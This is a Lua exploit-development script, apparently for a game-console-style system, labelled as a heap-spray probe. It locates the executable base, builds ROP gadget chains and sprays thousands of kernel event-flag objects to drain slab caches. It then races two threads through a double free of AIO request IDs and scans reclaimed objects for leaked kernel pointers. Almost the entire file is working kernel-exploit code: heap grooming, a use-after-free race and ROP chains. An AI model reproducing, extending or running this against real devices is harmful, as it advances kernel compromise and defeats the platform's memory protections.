-- CRASH_CLASS: HIGH
-- PROBE 69h: High-volume evf+namedobj spray for R-object reclaim
--
-- Prior spray probes maxed at 256 objects. UMA per-CPU caches hold ~64 objects
-- per CPU, so 256 may not drain the free list. This probe:
--   [A] Creates 4096 evf objects → measures 624 delta (slab page allocations)
--   [B] Triggers 65l-style double-free (16 IDs × 2 threads, gated with socketpair)
--   [C] Immediately sprays 128 evf with sentinel bits → checks for R reclaim
--   [D] Repeats with namedobj (48B name to target R's 64B bucket)
--   [E] For reclaimed objects: probe via 543 and read bits back
--
-- The key insight: R+0x00 and R+0x08 contain kernel thread pointers that
-- survive free. If evf or namedobj reclaims R's zone slot, reading the
-- evf's initial_bits or namedobj's data via 543/542 may return stale kernel
-- addresses.

print("=== PROBE 69h: HIGH-VOLUME SPRAY (4096+ drain) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS/SIGSEGV/SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local function read_624()
    local r = nil
    pcall(function() r = mk(624)(uint64(0)) end)
    return r and N(r) or nil
end

-- /dev/zero for AIO
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

-- ============================================================
-- AIO helpers
-- ============================================================
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- ============================================================
-- [A] DRAIN PER-CPU CACHES: create 4096 evf objects
-- ============================================================
print("")
print("[A] Draining per-CPU caches: 4096 evf objects")
local baseline_624 = read_624()
print("  624 baseline=" .. (baseline_624 or "nil"))

local drain_handles = {}
local drain_names = {}
for i = 1, 4096 do
    if not alive() then print("DEAD at drain " .. i); break end
    local name = string.format("d%07d", i)
    local np = put_str(name)
    local ret = nil
    pcall(function() ret = mk(538)(uint64(N(np)), uint64(0)) end)
    if ret and sgn(ret) ~= -1 then
        drain_handles[#drain_handles + 1] = ret
        drain_names[#drain_names + 1] = name
    else
        print("  evf_create limit at i=" .. i)
        break
    end
    if i % 1024 == 0 then
        print(string.format("  ...drained %d evf, 624=%s", i, tostring(read_624())))
    end
end

local post_drain_624 = read_624()
print(string.format("  drained %d evf objects", #drain_handles))
print(string.format("  624: %s -> %s (delta=%s)",
    tostring(baseline_624), tostring(post_drain_624),
    (baseline_624 and post_drain_624) and tostring(post_drain_624 - baseline_624) or "?"))

if not alive() then print("DEAD after drain"); return end

-- ============================================================
-- [B] DOUBLE-FREE RACE (65l-style with socketpair gates)
-- ============================================================
print("")
print("[B] Double-free race with spray")

local RACE_ITERS = 10
local total_kptr = 0

local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp) + 4) or -1
    return r, w
end

local del_ids   = memory.alloc(4 * BATCH + 0x10)
local states_A  = memory.alloc(4 * BATCH + 0x10)
local states_B  = memory.alloc(4 * BATCH + 0x10)
local marker_A  = memory.alloc(8)
local marker_B  = memory.alloc(8)
local tmp_A     = memory.alloc(8)
local tmp_B     = memory.alloc(8)
local wbyte     = memory.alloc(8)
wd(N(wbyte), 0x42)

local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)

for iter = 1, RACE_ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit + poll BATCH AIO IDs
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only %d IDs", iter, #ids))
        break
    end

    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Build child A ROP chain
    local sb_A = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) wq(sp_a + oa, v); oa = oa + 8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    local gate_rd_A, gate_wr_A = make_gate()
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gate_rd_A))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- Build child B ROP chain (same IDs as A)
    local sb_B = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    local gate_rd_B, gate_wr_B = make_gate()
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(gate_rd_B))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- Spawn children
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa) + 0x10, uint64(sb_A))
    wq(N(pa) + 0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb) + i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb) + 0x10, uint64(sb_B))
    wq(N(pb) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)

    -- Wait for markers
    local a_rdy, b_rdy = false, false
    for w = 1, 500000 do
        if not a_rdy and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if a_rdy and b_rdy then break end
    end
    if not (a_rdy and b_rdy) then
        print(string.format("  iter %d: TIMEOUT a=%s b=%s", iter, tostring(a_rdy), tostring(b_rdy)))
        break
    end

    -- Fire both gates simultaneously
    pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)

    -- IMMEDIATELY spray 128 evf objects with sentinel bits
    local spray_handles = {}
    local spray_624_pre = read_624()
    for si = 1, 128 do
        local name = string.format("s%d_%04d", iter, si)
        local np = put_str(name)
        local bits = 0xCAFE0000 + si
        local ret = nil
        pcall(function() ret = mk(538)(uint64(N(np)), uint64(bits)) end)
        if ret and sgn(ret) ~= -1 then
            spray_handles[#spray_handles + 1] = {handle = ret, bits = bits, idx = si}
        end
    end
    local spray_624_post = read_624()

    -- Wait for children
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  iter %d: CRASHED (spray=%d)", iter, #spray_handles))
        break
    end

    -- Check delete results
    local a_ok, b_ok, doubles = 0, 0, 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    -- -------------------------------------------------------
    -- [C] READBACK: check spray evf objects for contamination
    -- Read bits back via 543(handle, 0xFFFFFFFF, 1) — returns 0 if ANY bit set
    -- Then 542(handle, 0xFFFFFFFF, 1, result_ptr, 0) — writes satisfied bits
    -- -------------------------------------------------------
    local anomalies = 0
    local kptr_found = 0
    local evf_result = memory.alloc(8)

    for _, sp in ipairs(spray_handles) do
        local h = sp.handle
        local expected = sp.bits

        -- 543(handle, 0xFFFFFFFF, 1) — trywait any bit
        local try_ret = nil
        pcall(function() try_ret = mk(543)(h, uint64(0xFFFFFFFF), uint64(1)) end)

        -- 542(handle, 0xFFFFFFFF, 1, result_ptr, 0) — wait with result
        wq(N(evf_result), uint64(0xDEADDEADDEAD))
        pcall(function()
            mk(542)(h, uint64(0xFFFFFFFF), uint64(0x11), uint64(N(evf_result)), uint64(0))
        end)
        local result_val = rq(N(evf_result))
        if result_val then
            local rh, rl = get_hi_lo(result_val)
            if rh >= 0xFFFF8000 and rh ~= 0xFFFFFFFF then
                kptr_found = kptr_found + 1
                total_kptr = total_kptr + 1
                print(string.format("  *** KPTR *** iter=%d evf=%d result=%s (expected=0x%X)",
                    iter, sp.idx, fmt(result_val), expected))
            elseif rl ~= expected and rl ~= 0 and rl ~= 0xDEADDEAD then
                anomalies = anomalies + 1
                if anomalies <= 5 then
                    print(string.format("  ANOMALY iter=%d evf=%d got=%s expected=0x%X",
                        iter, sp.idx, fmt(result_val), expected))
                end
            end
        end
    end

    -- Clean up spray handles (delete evf)
    for _, sp in ipairs(spray_handles) do
        pcall(function() mk(539)(sp.handle) end)
    end

    local tag = ""
    if doubles > 0 then tag = " DBL=" .. doubles end
    if kptr_found > 0 then tag = tag .. " ***KPTR=" .. kptr_found .. "***" end
    if anomalies > 0 then tag = tag .. " anom=" .. anomalies end

    print(string.format("  iter %d: A=%d B=%d spray=%d 624_d=%s%s",
        iter, a_ok, b_ok, #spray_handles,
        (spray_624_pre and spray_624_post) and tostring(spray_624_post - spray_624_pre) or "?",
        tag))
end

if not alive() then print("DEAD after race loop"); return end

-- ============================================================
-- [D] CLEANUP: delete drain evf
-- ============================================================
print("")
print("[D] Cleanup: deleting " .. #drain_handles .. " drain evf objects")
for i, h in ipairs(drain_handles) do
    pcall(function() mk(539)(h) end)
    if i % 1024 == 0 then
        print(string.format("  ...deleted %d/%d", i, #drain_handles))
    end
end
local final_624 = read_624()
print(string.format("  624 final=%s", tostring(final_624)))

print("")
print("TOTAL_KPTR=" .. total_kptr)
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69h COMPLETE ===")
